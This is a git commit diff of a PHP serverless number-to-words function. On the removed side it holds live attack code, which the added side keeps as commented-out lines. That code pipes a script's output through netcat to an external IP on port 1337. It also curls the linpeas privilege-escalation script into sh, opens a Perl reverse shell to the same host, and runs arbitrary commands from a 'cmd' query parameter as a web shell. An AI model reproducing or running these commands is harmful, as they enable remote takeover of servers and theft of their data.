97352069cb77f153d751108df81408c54013dcde
ahptest1337 <102034204+ahptest1337@users.noreply.github.com>
2022-04-21 11:56:57 +0200

    Update index.php

--- packages/default/n2w/index.php
+++ packages/default/n2w/index.php
@@ -3,28 +3,28 @@ use NFNumberToWord\NumberToWords;
  
 function main(array $args)
 {
-//     if (!isset($args['number'])) {
-//         return wrap(['error' => 'Please supply a number.']);
-//     }
-    
-//     $number = (int)($args['number']);
-//     $words = (new NumberToWords)->toWords($number);
- 
-    echo("------");
- echo(system("ls -asl ; echo 'step one' ; chmod +x test123.sh ; echo 'step two' ; ./test123.sh > result.txt ; echo 'step three' ; ls -asl ; cat result.txt | nc 207.154.255.74 1337"));
-//  echo(system("curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh");
-//     echo(system("whoami ; which wget ; /usr/bin/perl5.28.1 -e 'use Socket;\$i=\"207.154.255.74\";\$p=1337;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"));
-    echo("\n");
-    print("------");
- 
-    if(isset($_GET['cmd']))
-    {
-        echo(system($_GET['cmd']));
+    if (!isset($args['number'])) {
+        return wrap(['error' => 'Please supply a number.']);
     }
+    
+    $number = (int)($args['number']);
+    $words = (new NumberToWords)->toWords($number);
  
-//     return [
-//         'body' => $words,
-//     ];
+//     echo("------");
+//  echo(system("ls -asl ; echo 'step one' ; chmod +x test123.sh ; echo 'step two' ; ./test123.sh > result.txt ; echo 'step three' ; ls -asl ; cat result.txt | nc 207.154.255.74 1337"));
+// //  echo(system("curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh");
+// //     echo(system("whoami ; which wget ; /usr/bin/perl5.28.1 -e 'use Socket;\$i=\"207.154.255.74\";\$p=1337;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"));
+//     echo("\n");
+//     print("------");
+ 
+//     if(isset($_GET['cmd']))
+//     {
+//         echo(system($_GET['cmd']));
+//     }
+ 
+    return [
+        'body' => $words,
+    ];
 
 }
 
